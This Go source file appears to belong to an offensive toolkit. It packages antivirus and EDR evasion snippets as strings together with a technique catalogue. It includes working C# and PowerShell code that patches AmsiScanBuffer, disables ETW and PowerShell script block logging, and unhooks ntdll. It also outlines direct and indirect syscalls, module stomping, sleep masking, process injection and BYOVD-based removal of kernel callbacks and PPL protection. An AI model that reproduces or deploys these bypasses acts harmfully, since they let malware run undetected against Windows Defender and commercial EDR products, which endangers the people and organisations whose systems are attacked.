// Package evasion ships AV/EDR bypass snippets and catalogues. Go analogue
// of Program/evasion/. The snippets themselves are code strings — C#,
// PowerShell, C++ — that a loader or macro would compile at runtime.
//
// This is a data package: it holds the snippet strings and exposes them
// through a small API. Nothing here executes anything. The caller decides
// what to do with the code (embed in a macro, drop to disk, run through
// Add-Type, etc.).
package evasion

import "strings"

// Lang identifies the snippet language.
type Lang string

const (
	LangCSharp     Lang = "csharp"
	LangPowerShell Lang = "powershell"
	LangCPP        Lang = "cpp"
	LangPython     Lang = "python"
)

// Snippet is one runnable bypass.
type Snippet struct {
	Name    string
	Lang    Lang
	Defeats string // one-line note on what layer it bypasses
	Body    string
}

// AMSIPatchCSharp patches AmsiScanBuffer in the current process so every
// subsequent AMSI scan returns E_INVALIDARG. C# reflection, no external
// deps. Defeats Windows Defender AMSI scanning for PowerShell / .NET.
const AMSIPatchCSharp = `// C# — AMSI patch via reflection
// Targets: amsi.dll!AmsiScanBuffer
// Defeats: PowerShell/.NET AMSI scanning in this process only
using System;
using System.Runtime.InteropServices;

public class AmsiPatch {
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static void Patch() {
        IntPtr lib = LoadLibrary("amsi.dll");
        IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");
        // B8 57 00 07 80 C3  =  mov eax, 0x80070057 ; ret
        byte[] patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        uint old;
        VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out old);
        Marshal.Copy(patch, 0, addr, patch.Length);
        VirtualProtect(addr, (UIntPtr)patch.Length, old, out old);
    }
}`

// AMSIPatchPowerShell is the same patch wrapped in PowerShell's Add-Type.
const AMSIPatchPowerShell = `# PowerShell — AMSI patch via Add-Type
$sig = @"
using System;
using System.Runtime.InteropServices;
public class A {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint n, out uint o);
    public static void P() {
        IntPtr l = LoadLibrary("amsi.dll");
        IntPtr a = GetProcAddress(l, "AmsiScanBuffer");
        byte[] p = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        uint o; VirtualProtect(a, (UIntPtr)p.Length, 0x40, out o);
        Marshal.Copy(p, 0, a, p.Length);
        VirtualProtect(a, (UIntPtr)p.Length, o, out o);
    }
}
"@
Add-Type -TypeDefinition $sig
[A]::P()`

// ETWPatchCSharp nulls the .NET EventProvider's m_enabled field via
// reflection. Kills .NET-derived telemetry.
const ETWPatchCSharp = `// C# — ETW patch via reflection
using System;
using System.Reflection;

public class EtwPatch {
    public static void Patch() {
        var t = Type.GetType("System.Diagnostics.Tracing.EventProvider");
        var f = t.GetField("m_enabled", BindingFlags.NonPublic | BindingFlags.Static);
        f.SetValue(null, 0);
    }
}`

// ETWPatchPowerShell is the same patch wrapped for PowerShell.
const ETWPatchPowerShell = `# PowerShell — ETW patch via reflection (kills .NET EventSource + PS script block logging)
$etw = [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Tracing.EventProvider')
$field = $etw.GetField('m_enabled', 'NonPublic,Static')
$field.SetValue($null, 0)`

// UnhookNtdllCSharp reloads ntdll from KnownDlls to strip EDR userland
// hooks.
const UnhookNtdllCSharp = `// C# — ntdll unhook from KnownDlls
using System;
using System.Runtime.InteropServices;

public class Unhook {
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr CreateFile(string name, uint access, uint share, IntPtr sec, uint disp, uint flags, IntPtr tmpl);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateFileMapping(IntPtr h, IntPtr sec, uint prot, uint hi, uint lo, string name);
    [DllImport("kernel32.dll")]
    static extern IntPtr MapViewOfFile(IntPtr h, uint access, uint hi, uint lo, UIntPtr bytes);
    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string name);
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr addr, UIntPtr size, uint prot, out uint old);
    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr h);

    public static void Clean() {
        IntPtr hooked = GetModuleHandle("ntdll.dll");
        IntPtr h = CreateFile(@"\\.\KnownDlls\ntdll.dll", 0x80000000, 0x1, IntPtr.Zero, 3, 0, IntPtr.Zero);
        if (h == (IntPtr)(-1)) return;
        IntPtr map = CreateFileMapping(h, IntPtr.Zero, 0x02, 0, 0, null);
        IntPtr fresh = MapViewOfFile(map, 0x04, 0, 0, UIntPtr.Zero);
        uint old;
        VirtualProtect(hooked, (UIntPtr)0x100000, 0x40, out old);
        unsafe {
            byte* src = (byte*)fresh.ToPointer();
            byte* dst = (byte*)hooked.ToPointer();
            for (int i = 0; i < 0x100000; i++) dst[i] = src[i];
        }
        VirtualProtect(hooked, (UIntPtr)0x100000, old, out old);
        CloseHandle(map); CloseHandle(h);
    }
}`

// DirectSyscallCPP is the shape of a direct syscall stub. The SSN is
// resolved at runtime.
const DirectSyscallCPP = `// C++ — direct syscall stub
// SSN resolved at runtime from a fresh ntdll image.
//
// Bytes:
//   4C 8B D1              mov r10, rcx
//   B8 <ssn> 00 00 00     mov eax, <ssn>
//   0F 05                 syscall
//   C3                    ret

extern "C" NTSTATUS DirectNtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);`

// IndirectSyscallCSharp describes the indirect syscall pattern.
const IndirectSyscallCSharp = `// C# — indirect syscall stub
// HellsGate: SSN resolved at runtime from ntdll export scan, syscall
// instruction invoked inside ntdll's code section so the return address
// looks legitimate.
//
// 1. Walk the export directory of ntdll.dll.
// 2. For each Nt* export, first bytes are 4C 8B D1 B8 (mov r10, rcx; mov eax, SSN).
// 3. SSN = *(uint32*)(stub + 4).
// 4. Emit: 4C 8B D1 B8 <ssn> 00 00 00 0F 05 C3`

// ModulesStompingCSharp is a note-only snippet; the actual stomp is
// loader-dependent.
const ModuleStompingCSharp = `// C# — module stomping outline
// 1. LoadLibrary a signed benign DLL (xpsprint.dll, mshtml.dll, winhttp.dll).
// 2. Overwrite the DLL's .text with the shellcode.
// 3. Jump into it.
// The region looks backed by a legit image; no unbacked RWX pages.`

// Snippets is the catalogue of all shipped bypasses.
var Snippets = []Snippet{
	{
		Name:    "amsi_patch_csharp",
		Lang:    LangCSharp,
		Defeats: "Windows Defender AMSI scanning in the current process",
		Body:    AMSIPatchCSharp,
	},
	{
		Name:    "amsi_patch_powershell",
		Lang:    LangPowerShell,
		Defeats: "AMSI in the current PS process via Add-Type",
		Body:    AMSIPatchPowerShell,
	},
	{
		Name:    "etw_patch_csharp",
		Lang:    LangCSharp,
		Defeats: ".NET runtime event telemetry",
		Body:    ETWPatchCSharp,
	},
	{
		Name:    "etw_patch_powershell",
		Lang:    LangPowerShell,
		Defeats: ".NET EventSource + PS script block logging",
		Body:    ETWPatchPowerShell,
	},
	{
		Name:    "unhook_ntdll_csharp",
		Lang:    LangCSharp,
		Defeats: "userland EDR hooks on ntdll (Defender, CrowdStrike, etc.)",
		Body:    UnhookNtdllCSharp,
	},
	{
		Name:    "direct_syscall_cpp",
		Lang:    LangCPP,
		Defeats: "userland hooks by bypassing ntdll entirely",
		Body:    DirectSyscallCPP,
	},
	{
		Name:    "indirect_syscall_csharp",
		Lang:    LangCSharp,
		Defeats: "userland hooks with return-address plausibility",
		Body:    IndirectSyscallCSharp,
	},
	{
		Name:    "module_stomping_csharp",
		Lang:    LangCSharp,
		Defeats: "unbacked-RWX memory scanners",
		Body:    ModuleStompingCSharp,
	},
}

// Catalogue carries the higher-level AV/EDR technique reference. Same
// shape as Program/evasion/'s catalogue.
type Technique struct {
	Name    string
	Layer   string
	Defeats []string
	Notes   []string
}

// Catalogue is the reference list.
var Catalogue = []Technique{
	{
		Name:    "amsi_patch",
		Layer:   "userland — amsi.dll in the current process",
		Defeats: []string{"Windows Defender AMSI (PowerShell, .NET, VBS, Office macros)"},
		Notes: []string{
			"Get a handle to amsi.dll, find AmsiScanBuffer, overwrite the first bytes with 0xB8 0x57 0x00 0x07 0x80 0xC3.",
			"Requires VirtualProtect. EDRs that hook VirtualProtect on amsi.dll will see the write.",
		},
	},
	{
		Name:    "etw_patch",
		Layer:   "userland — EventSource in the current process",
		Defeats: []string{".NET runtime telemetry, PowerShell script block logging"},
		Notes: []string{
			"Set EventProvider.m_enabled to 0 via reflection.",
			"Or patch ntdll!EtwEventWrite to xor eax, eax; ret.",
			"Kills .NET telemetry. Kernel-side ETW is unaffected.",
		},
	},
	{
		Name:    "unhooking",
		Layer:   "userland — the current process's ntdll image",
		Defeats: []string{"userland EDR hooks on ntdll (most vendors)"},
		Notes: []string{
			"Map a fresh copy of ntdll from KnownDlls or disk.",
			"Copy the .text section over the hooked image.",
			"Syscall stubs and function prologues go back to their original bytes.",
		},
	},
	{
		Name:    "direct_syscalls",
		Layer:   "userland — replaces the call path, not the callee",
		Defeats: []string{"any userland hook on ntdll"},
		Notes: []string{
			"Load syscall numbers at runtime. Emit mov r10, rcx; mov eax, <ssn>; syscall; ret.",
			"Windows 10 19045+ / Windows 11 hardened call stacks break naive direct syscalls.",
			"Indirect syscalls keep the syscall instruction inside ntdll.",
		},
	},
	{
		Name:    "module_stomping",
		Layer:   "userland — shellcode inside a signed module's range",
		Defeats: []string{"unbacked executable region scanners (BeaconEye, pe-sieve)"},
		Notes: []string{
			"LoadLibrary a benign Microsoft-signed DLL.",
			"Overwrite the DLL's .text with the beacon.",
			"Memory scans see the region as backed by a legit image.",
		},
	},
	{
		Name:    "sleep_masking",
		Layer:   "userland — the payload's own memory region",
		Defeats: []string{"memory scanners hunting beacon signatures during sleep"},
		Notes: []string{
			"EKKO: multi-threaded, timer-queue-based. Encrypt the beacon region during sleep.",
			"Foliage: thread-pool callback variant.",
		},
	},
	{
		Name:    "process_injection",
		Layer:   "userland — moves shellcode into a remote process",
		Defeats: []string{"detection depends on variant"},
		Notes: []string{
			"CreateRemoteThread, APC injection, thread hijacking, NtCreateSection, hollowing, doppelganging.",
			"Pick based on which APIs the EDR hooks.",
		},
	},
	{
		Name:    "indirect_syscall",
		Layer:   "userland — syscall instruction stays inside ntdll",
		Defeats: []string{"EDRs that flag direct syscall opcodes outside ntdll"},
		Notes: []string{
			"HellsGate: read SSN from each stub's mov eax, imm.",
			"TartarusGate: handles hooked stubs where the SSN is not visible.",
		},
	},
	{
		Name:    "callback_evasion",
		Layer:   "kernel — needs BYOVD",
		Defeats: []string{"kernel callbacks (PsSetCreateProcessNotifyRoutine, ObRegisterCallbacks)"},
		Notes: []string{
			"Requires a signed vulnerable driver (BYOVD).",
			"Read the callback array from the EDR driver, zero the entries.",
		},
	},
	{
		Name:    "ppl_bypass",
		Layer:   "kernel — driver-based",
		Defeats: []string{"PPL-protected AV processes"},
		Notes: []string{
			"Clear EPROCESS.Protection on the target process via kernel R/W.",
			"Requires BYOVD or a kernel primitive.",
		},
	},
}

// ByName returns the snippet with the given name or (Snippet{}, false).
func ByName(name string) (Snippet, bool) {
	for _, s := range Snippets {
		if s.Name == name {
			return s, true
		}
	}
	return Snippet{}, false
}

// ByLang returns every snippet in a given language.
func ByLang(l Lang) []Snippet {
	var out []Snippet
	for _, s := range Snippets {
		if s.Lang == l {
			out = append(out, s)
		}
	}
	return out
}

// SearchCatalogue returns techniques whose Name contains the query
// (case-insensitive).
func SearchCatalogue(q string) []Technique {
	q = strings.ToLower(q)
	var out []Technique
	for _, t := range Catalogue {
		if strings.Contains(strings.ToLower(t.Name), q) {
			out = append(out, t)
		}
	}
	return out
}
